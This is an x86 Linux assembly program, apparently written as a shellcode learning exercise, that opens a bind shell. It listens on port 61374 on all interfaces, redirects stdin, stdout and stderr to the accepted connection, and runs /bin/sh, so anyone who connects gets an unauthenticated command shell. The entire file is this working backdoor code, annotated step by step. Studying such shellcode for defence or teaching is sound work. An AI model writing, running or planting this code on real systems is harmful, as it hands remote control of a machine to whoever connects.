global _start

;; I was using a little-endian machine, so data is read in reverse(technically meaning LSB first)
;; I used Intel syntax! 
section .text
_start:
    mov     eax, 0x66           ;; socketcall syscall number
    mov     ebx, 0x01           ;; SYS_SOCKET call number for socket creation

    push    DWORD 0x00000000    ;; IP_PROTO
    push    DWORD 0x00000001    ;; SOCK_STREAM
    push    DWORD 0x00000002    ;; AF_INET

    mov     ecx, esp
    int     0x80

    mov     esi, eax            ;; copy socket fd because eax will be needed otherwise

    ;; prepare sockaddr_in struct
    push    DWORD 0x00000000    ;; 4 bytes padding
    push    DWORD 0x00000000    ;; 4 bytes padding
    push    DWORD 0x00000000    ;; INADDR_ANY
    push    WORD 0xbeef         ;; port 61374
    push    WORD 0x0002         ;; AF_INET

    mov     ecx, esp            ;; save struct address

    ;; arguments to bind()
    push    DWORD 0x00000010    ;; size of our sockaddr_in struct
    push    ecx                 ;; pointer to sockaddr_in struct
    push    esi                 ;; socket file descriptor

    mov     ecx, esp            ;; set ecx to bind() args to prep for socketcall syscall
    mov     eax, 0x66           ;; socketcall syscall number
    mov     ebx, 0x02           ;; SYS_BIND call number
    int     0x80

    mov     eax, 0x66
    mov     ebx, 0x04           ;; SYS_LISTEN call number
    push    0x00000000          ;; listen() backlog argument (4 byte int)
    push    esi                 ;; socket fd
    mov     ecx, esp            ;; pointer to args for listen()
    int     0x80

    mov     eax, 0x66
    mov     ebx, 0x05           ;; SYS_ACCEPT call number
    push    DWORD 0x00000000
    push    DWORD 0x00000000
    push    esi                 ;; socket fd
    int     0x80

    mov     ebx, eax            ;; copy fd of the new connection socket to ebx for dup2()

    mov     eax, 0x3f           ;; syscall nunber goes into eax
    xor     ecx, ecx            ;; duplicate stdin
    int     0x80

    mov     eax, 0x3f
    inc     ecx                 ;; duplicate stdout
    int     0x80

    mov     eax, 0x3f
    inc     ecx                 ;; duplicate stderr
    int     0x80

    mov     eax, 0x0b           ;; execve syscall
    xor     ecx, ecx            ;; no arguments for /bin/sh
    xor     edx, edx            ;; no env variables
    push    DWORD 0x0068732f    ;; hs/
    push    DWORD 0x6e69622f    ;; nib/
    mov     ebx, esp            ;; start of /bin/sh string
    int     0x80
